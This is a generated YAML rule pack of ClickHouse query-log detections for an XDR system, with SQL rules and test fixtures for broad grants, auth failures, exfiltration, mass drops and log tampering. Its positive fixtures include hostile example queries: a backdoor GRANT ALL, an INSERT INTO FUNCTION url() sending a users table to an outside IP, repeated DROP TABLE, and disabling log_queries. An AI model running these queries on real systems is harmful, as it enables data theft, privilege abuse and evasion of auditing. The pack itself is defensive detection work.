# Generated by scripts/gen_rule_packs.py - edit there, then re-run it.
pack_id: clickhouse
name: ClickHouse
vendor: ClickHouse
version: 1
description: "ClickHouse query_log detections: broad grants, authentication bursts, exfiltration through url()/s3()/remote() or INTO OUTFILE, very large reads, mass drops, credential reconnaissance, access-denied storms and query-log tampering."
requires: [{"table": "DATABASE_ACTIVITY", "vendor_product": "clickhouse"}]
onboarding: "Run otel-receiver/collector-examples/clickhouse_forwarder.py (reads system.query_log incrementally), service.name clickhouse."
rules:
  - id: CH-001
    name: "ALL privileges granted"
    description: "GRANT ALL / GRANT ... WITH GRANT OPTION or access_management for a user or role."
    severity: 4
    tactic: "TA0004"
    technique: "T1098"
    table: "DATABASE_ACTIVITY"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "clickhouse", "body": {"type": "QueryFinish", "user": "{{entity}}", "address": "::ffff:10.30.0.7", "query_kind": "Grant", "query": "GRANT ALL ON *.* TO backdoor WITH GRANT OPTION", "read_rows": 10, "result_rows": 10, "read_bytes": 1000, "client_name": "clickhouse-client", "query_id": "q1", "tables": ["default.events"]}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "clickhouse", "body": {"type": "QueryFinish", "user": "{{entity}}", "address": "::ffff:10.30.0.7", "query_kind": "Grant", "query": "GRANT SELECT ON analytics.* TO reporting", "read_rows": 10, "result_rows": 10, "read_bytes": 1000, "client_name": "clickhouse-client", "query_id": "q1", "tables": ["default.events"]}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, src, dest, 'Broad grant: ' || LEFT(query_text, 200) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
      WHERE vendor_product = 'clickhouse' AND (result = 'success' AND query_type = 'GRANT' AND REGEXP_LIKE(query_text, '.*(GRANT[[:space:]]+ALL|WITH[[:space:]]+GRANT[[:space:]]+OPTION|ACCESS[[:space:]]+MANAGEMENT).*', 'is'))

  - id: CH-002
    name: "ClickHouse authentication failures"
    description: "Ten or more AUTHENTICATION_FAILED (516) errors for one user and source in 10 minutes."
    severity: 4
    tactic: "TA0006"
    technique: "T1110"
    table: "DATABASE_ACTIVITY"
    threshold: 10
    window_minutes: 10
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "clickhouse", "body": {"type": "ExceptionBeforeStart", "user": "{{entity}}", "address": "::ffff:10.30.0.7", "query_kind": "Select", "query": "SELECT 1", "read_rows": 10, "result_rows": 10, "read_bytes": 1000, "client_name": "clickhouse-client", "query_id": "q1", "tables": ["default.events"], "exception": "Code: 516. DB::Exception: AUTHENTICATION_FAILED"}}, "count": 10, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "clickhouse", "body": {"type": "ExceptionBeforeStart", "user": "{{entity}}", "address": "::ffff:10.30.0.7", "query_kind": "Select", "query": "SELECT 1", "read_rows": 10, "result_rows": 10, "read_bytes": 1000, "client_name": "clickhouse-client", "query_id": "q1", "tables": ["default.events"], "exception": "Code: 516. DB::Exception: AUTHENTICATION_FAILED"}}, "count": 2, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, src, dest, 'Auth failed: ' || LEFT(COALESCE(reason, ''), 150) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
      WHERE vendor_product = 'clickhouse' AND (result = 'failure' AND (reason ILIKE '%AUTHENTICATION_FAILED%' OR reason ILIKE 'Code: 516%'))

  - id: CH-003
    name: "Data sent out through table functions"
    description: "INSERT INTO FUNCTION url()/s3()/remote() or SELECT ... INTO OUTFILE."
    severity: 4
    tactic: "TA0010"
    technique: "T1567"
    table: "DATABASE_ACTIVITY"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "clickhouse", "body": {"type": "QueryFinish", "user": "{{entity}}", "address": "::ffff:10.30.0.7", "query_kind": "Insert", "query": "INSERT INTO FUNCTION url('https://203.0.113.9/up', 'CSV') SELECT * FROM users", "read_rows": 10, "result_rows": 10, "read_bytes": 1000, "client_name": "clickhouse-client", "query_id": "q1", "tables": ["default.events"]}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "clickhouse", "body": {"type": "QueryFinish", "user": "{{entity}}", "address": "::ffff:10.30.0.7", "query_kind": "Insert", "query": "INSERT INTO events SELECT * FROM staging_events", "read_rows": 10, "result_rows": 10, "read_bytes": 1000, "client_name": "clickhouse-client", "query_id": "q1", "tables": ["default.events"]}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, src, dest, 'External write: ' || LEFT(query_text, 200) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
      WHERE vendor_product = 'clickhouse' AND (result = 'success' AND REGEXP_LIKE(query_text, '.*(INTO[[:space:]]+FUNCTION[[:space:]]+(url|s3|remote|remoteSecure|mysql|postgresql)[[:space:]]*[(]|INTO[[:space:]]+OUTFILE).*', 'is'))

  - id: CH-004
    name: "Very large read"
    description: "A query read 100M+ rows or returned 1M+ rows."
    severity: 3
    tactic: "TA0009"
    technique: "T1213"
    table: "DATABASE_ACTIVITY"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    false_positives: "Scheduled aggregations by service users."
    fixtures: {"positive": [{"otel": {"service_name": "clickhouse", "body": {"type": "QueryFinish", "user": "{{entity}}", "address": "::ffff:10.30.0.7", "query_kind": "Select", "query": "SELECT * FROM users", "read_rows": 150000000, "result_rows": 150000000, "read_bytes": 15000000000, "client_name": "clickhouse-client", "query_id": "q1", "tables": ["default.events"]}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "clickhouse", "body": {"type": "QueryFinish", "user": "{{entity}}", "address": "::ffff:10.30.0.7", "query_kind": "Select", "query": "SELECT count() FROM users", "read_rows": 5000000, "result_rows": 1, "read_bytes": 500000000, "client_name": "clickhouse-client", "query_id": "q1", "tables": ["default.events"]}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, src, dest, user_name || ' read ' || COALESCE(_raw:read_rows::VARCHAR, '?') || ' rows from ' || COALESCE(object, '?') AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
      WHERE vendor_product = 'clickhouse' AND (result = 'success' AND (COALESCE(_raw:read_rows::NUMBER, 0) >= 100000000 OR COALESCE(rows_affected, 0) >= 1000000))

  - id: CH-005
    name: "Mass drop or truncate"
    description: "Five or more DROP / TRUNCATE statements by one user in 10 minutes."
    severity: 4
    tactic: "TA0040"
    technique: "T1485"
    table: "DATABASE_ACTIVITY"
    threshold: 5
    window_minutes: 10
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "clickhouse", "body": {"type": "QueryFinish", "user": "{{entity}}", "address": "::ffff:10.30.0.7", "query_kind": "Drop", "query": "DROP TABLE logs_{{n}}", "read_rows": 10, "result_rows": 10, "read_bytes": 1000, "client_name": "clickhouse-client", "query_id": "q1", "tables": ["default.events"]}}, "count": 6, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "clickhouse", "body": {"type": "QueryFinish", "user": "{{entity}}", "address": "::ffff:10.30.0.7", "query_kind": "Drop", "query": "DROP TABLE tmp_{{n}}", "read_rows": 10, "result_rows": 10, "read_bytes": 1000, "client_name": "clickhouse-client", "query_id": "q1", "tables": ["default.events"]}}, "count": 2, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, src, dest, LEFT(query_text, 150) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
      WHERE vendor_product = 'clickhouse' AND (result = 'success' AND query_type = 'DROP' OR (vendor_product = 'clickhouse' AND result = 'success' AND REGEXP_LIKE(query_text, '^[[:space:]]*TRUNCATE.*', 'is')))

  - id: CH-006
    name: "Credential and grant reconnaissance"
    description: "Five or more queries against system.users / system.grants / system.role_grants in 10 minutes."
    severity: 2
    tactic: "TA0007"
    technique: "T1087"
    table: "DATABASE_ACTIVITY"
    threshold: 5
    window_minutes: 10
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "clickhouse", "body": {"type": "QueryFinish", "user": "{{entity}}", "address": "::ffff:10.30.0.7", "query_kind": "Select", "query": "SELECT * FROM system.grants", "read_rows": 10, "result_rows": 10, "read_bytes": 1000, "client_name": "clickhouse-client", "query_id": "q1", "tables": ["default.events"]}}, "count": 5, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "clickhouse", "body": {"type": "QueryFinish", "user": "{{entity}}", "address": "::ffff:10.30.0.7", "query_kind": "Select", "query": "SELECT * FROM system.grants", "read_rows": 10, "result_rows": 10, "read_bytes": 1000, "client_name": "clickhouse-client", "query_id": "q1", "tables": ["default.events"]}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, src, dest, 'Recon: ' || LEFT(query_text, 150) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
      WHERE vendor_product = 'clickhouse' AND (REGEXP_LIKE(query_text, '.*system[.](users|grants|role_grants|quotas|settings_profiles).*', 'is'))

  - id: CH-007
    name: "Access-denied storm"
    description: "Twenty or more ACCESS_DENIED (497) errors for one user in 15 minutes."
    severity: 3
    tactic: "TA0007"
    technique: "T1069"
    table: "DATABASE_ACTIVITY"
    threshold: 20
    window_minutes: 15
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "clickhouse", "body": {"type": "ExceptionBeforeStart", "user": "{{entity}}", "address": "::ffff:10.30.0.7", "query_kind": "Select", "query": "SELECT * FROM finance.ledger", "read_rows": 10, "result_rows": 10, "read_bytes": 1000, "client_name": "clickhouse-client", "query_id": "q1", "tables": ["default.events"], "exception": "Code: 497. DB::Exception: ACCESS_DENIED"}}, "count": 20, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "clickhouse", "body": {"type": "ExceptionBeforeStart", "user": "{{entity}}", "address": "::ffff:10.30.0.7", "query_kind": "Select", "query": "SELECT * FROM finance.ledger", "read_rows": 10, "result_rows": 10, "read_bytes": 1000, "client_name": "clickhouse-client", "query_id": "q1", "tables": ["default.events"], "exception": "Code: 497. DB::Exception: ACCESS_DENIED"}}, "count": 3, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, src, dest, 'Denied: ' || LEFT(COALESCE(reason, ''), 150) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
      WHERE vendor_product = 'clickhouse' AND (result = 'failure' AND (reason ILIKE '%ACCESS_DENIED%' OR reason ILIKE 'Code: 497%'))

  - id: CH-008
    name: "Query logging disabled"
    description: "log_queries turned off for a session, profile or user."
    severity: 4
    tactic: "TA0005"
    technique: "T1562"
    table: "DATABASE_ACTIVITY"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "clickhouse", "body": {"type": "QueryFinish", "user": "{{entity}}", "address": "::ffff:10.30.0.7", "query_kind": "Alter", "query": "ALTER SETTINGS PROFILE default SETTINGS log_queries = 0", "read_rows": 10, "result_rows": 10, "read_bytes": 1000, "client_name": "clickhouse-client", "query_id": "q1", "tables": ["default.events"]}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "clickhouse", "body": {"type": "QueryFinish", "user": "{{entity}}", "address": "::ffff:10.30.0.7", "query_kind": "Alter", "query": "ALTER SETTINGS PROFILE default SETTINGS log_queries = 1", "read_rows": 10, "result_rows": 10, "read_bytes": 1000, "client_name": "clickhouse-client", "query_id": "q1", "tables": ["default.events"]}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, src, dest, 'Query log disabled: ' || LEFT(query_text, 150) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
      WHERE vendor_product = 'clickhouse' AND (REGEXP_LIKE(query_text, '.*log_queries[[:space:]]*=[[:space:]]*(0|false).*', 'is'))

